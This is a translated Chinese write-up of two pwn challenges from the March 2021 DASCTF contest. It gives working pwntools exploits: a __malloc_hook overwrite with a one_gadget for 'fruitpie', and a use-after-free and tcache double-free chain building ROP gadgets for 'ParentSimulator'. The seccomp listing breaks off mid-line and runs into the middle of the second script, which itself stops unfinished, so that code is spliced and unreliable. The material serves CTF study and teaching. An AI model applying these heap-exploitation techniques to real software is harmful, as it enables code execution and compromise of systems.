# 2021 MAR DASCTF 部分PWN WriteUP
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## fruiteie
首先看一下程序的逻辑，首先是读取了用户输入的一个`size`，然后程序申请了对应大小的堆块`heap`，输出`heap`地址之后接着读取了一个十六进制的数作为`offset`，接着向`heap+offset`的位置读取了`0x10`字节大小的数据。最后又申请了一个`0xa0`大小的堆块。
那么这里题目的提示很明显了，也就是利用`offset`写`one_gadget`到`malloc_hook`中去，在调用`malloc(0xa0)`的时候触发`one_gadget`的调用，`getshell`。
但是这里存在一个问题就是如何泄漏出`libc`的地址，再读一下程序，我们注意到这里`malloc(size)`的时候`size`为可以为负数，因此这里我们输入一个`-1`，那么`malloc`就会调用`mmap`去申请一个很大的内存空间，经过调试发现这个内存空间的起始地址与`libc`的基地址偏移是固定的。
那么我们就根据输出的`heap`地址就可以推算出`libc`基地址。
    # encoding=utf-8
    from pwn import *
    file_path = "./fruitpie"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 1
    if debug:
        p = process([file_path])
        gdb.attach(p, "b *$rebase(0xCC9)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = [0x45226, 0x4527, 0xf0364, 0xf1207]
    else:
        p = remote('54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com', 50202)
        libc = ELF('./libc.so.6')
        one_gadget = [0x4f365, 0x4f3c2, 0x10a45c]
    p.sendlineafter("Enter the size to malloc:\n", str(-1))
    heap_address = int(p.recvline().strip(), 16)
    log.success("heap address is {}".format(hex(heap_address)))
    libc.address = heap_address + 0x100001000 - 0x10
    log.success("libc address is {}".format(hex(libc.address)))
    log.success("malloc_hook is {}".format(hex(libc.sym['__malloc_hook'])))
    different = libc.sym['__malloc_hook'] - heap_address
    log.success("different is {}".format(hex(different)))
    p.sendlineafter("Offset:", hex(different)[2:])
    p.sendafter("Data:\n", p64(one_gadget[2] + libc.address))
    p.interactive()
## ParentSimulator
首先看一下程序的逻辑，首先是第一个函数调用，这里需要注意的是程序开启了沙箱，然后还打开了一个文件，最重要的是调用了`chdir("/")`函数。
    open("/tmp", 0);
    lchown("/tmp/ohohoho/", 0, 0);
    chroot("/tmp/ohohoho/");
    chdir("/");
接着向下分析程序提供了五种功能和一个后门，我们首先看一下`add`函数，`add`函数申请了一个`child`结构体，该结构体的大小为`0x110`，结构体的成员变量如下
    00000000 child           struc ; (sizeof=0x100, mappedto_8)
    00000000 name            db 8 dup(?)
    00000008 sex             db 8 dup(?)
    00000010 des             db 240 dup(?)
    00000100 child           ends
也就是有三个成员变量，在`add`函数中为`name,sex`这两个成员变量赋值。然后提供了`change_name,edit_des`这两个函数，用来修改`name`成员变量和为`des`赋值。还有一个`show`函数将这三个成员变量的内容全部输出。
还存在一个`delete`函数，用来删除结构体，需要注意的是这三个函数只有当`is_alive[index]`对应的位置为`1`的时候才能操作，即进行了一个是否已经被删除的检查。
这几个函数都没有什么问题，我们重点看一下后门函数，也就是`666`的时候调用的函数。该函数只能调用一次。
    printf("Current gender:%s\n", node_list[v2]->sex);
    puts("Please rechoose your child's gender.\n1.Boy\n2.Girl:");
    v3 = readint();
    if ( v3 == 1 )
    {
      v0 = (struct child *)node_list[v2]->sex;
      *(_DWORD *)v0->name = 0x796F62;
    }
    else if ( v3 == 2 )
    {
      v0 = (struct child *)node_list[v2]->sex;
      strcpy(v0->name, "girl");
    }
函数的主要功能就是输出和修改`sex`成员变量，那么这里我们注意到该函数调用的时候并没有对`is_alive`这个数组相应的位置进行检查，也就是说这里存在一个`UAF`。利用`sex`的输出可以泄漏一下堆地址。
而注意到`sex`成员变量的特殊位置`+0x8`，正好是`tcache`对`double
free`进行检查的位置，也就是`key`变量的位置，那么我们可以通过后门函数修改`key`，构造一个`double
free`，此时就可以完成一次任意地址分配。
为了持续的利用`double
free`，选择将任意地址分配的位置为某一个堆块起始地址`-0x20`的位置。利用`change_descirption`这个函数修改改`des`成员变量的功能就可以修改这个堆块的`fd`指针，就可以完成多次的任意地址分配。
    0x56207637a0a0: 0x00005620781883b0(child_list)      0x00005620781883b0
    0x56207637a0b0: 0x00005620781884c0      0x0000562078188390(child_3)
    0x56207637a0c0: 0x0000000000000000      0x0000000000000000
从上面的堆分配来说，通过`index=3`的堆块就可以控制`index=0`的堆快。
现在有了任意地址分配，还差一个地址泄漏，这里我才用的就是利用任意地址分配将堆块分配到`pthread_tcache_struct`位置处，然后释放，那么`pthread_tcache_struct`结构体中就存在了一个`libc`附近的地址，那么再次利用任意地址分配，分配堆快到`libc_address-0x20`的位置，使得`des`成员变量恰好指向`libc`附近的地址，那么此时利用`show`函数就可以泄漏出`libc`地址了。
由于这个题目开启了沙箱
    line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x00 0x01 0x40000000  if (A > ", "1")
        p.sendlineafter("input index?", str(index))
        p.sendlineafter("1.Boy\n2.Girl:\n", str(sex))
        p.sendafter("your child's name:\n", name[:-1])
    def change_name(index, name):
        p.sendlineafter(">> ", "2")
        p.sendlineafter("input index?", str(index))
        p.sendafter("child's new name:\n", name)
    def show_name(index):
        p.sendlineafter(">> ", "3")
        p.sendlineafter("input index?", str(index))
    def delete(index):
        p.sendlineafter(">> ", "4")
        p.sendlineafter("input index?", str(index))
    def change_des(index, content):
        p.sendlineafter(">> ", "5")
        p.sendlineafter("input index?", str(index))
        p.sendafter("child's description:\n", content)
    def back(index):
        p.sendlineafter(">> ", "666")
        p.sendlineafter("input index?", str(index))
    add(0)
    add(1)
    add(2)
    add(9)
    delete(0)
    delete(1)
    back(1)
    p.recvuntil("Current gender:")
    heap_address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x10
    p.sendlineafter("1.Boy\n2.Girl:\n", str(1))
    delete(1)
    add(0, 1, p64(heap_address + 0x390))
    add(1, 1, p64(0))
    add(3, 1, p64(0)) # control 0, 1
    delete(2)
    delete(0)
    change_des(3, p64(0) + p64(0x111) + p64(heap_address + 0x10))
    add(0)
    add(4) # pthread_tcache_struct
    change_des(4, p64(0)*7 + p64(0x0007000000000000))
    delete(4)
    add(4, 1, p64(0))
    delete(0)
    change_des(3, p64(0) + p64(0x111) + p64(heap_address + 0x110))
    change_des(4, p64(0) + p64(0x0002000000000000))
    add(0)
    add(5)
    show_name(5)
    p.recvuntil("Description:")
    libc.address = u64(p.recv(6).strip().ljust(8, b"\x00")) - 96 - 0x10 - libc.sym['__malloc_hook']
    p_rsi_r = 0x0000000000027529 + libc.address
    p_rdi_r = 0x0000000000026b72 + libc.address
    p_rdx_r12_r = 0x000000000011c1e1 + libc.address
    p_rax_r = 0x000000000004a550 + libc.address
    syscall = 0x0000000000066229 + libc.address
    ret = 0x00000000000c1479 + libc.address
    flag_str_address = libc.sym['__free_hook'] + 0xa0
    flag_address = libc.sym['__free_hook'] + 0x30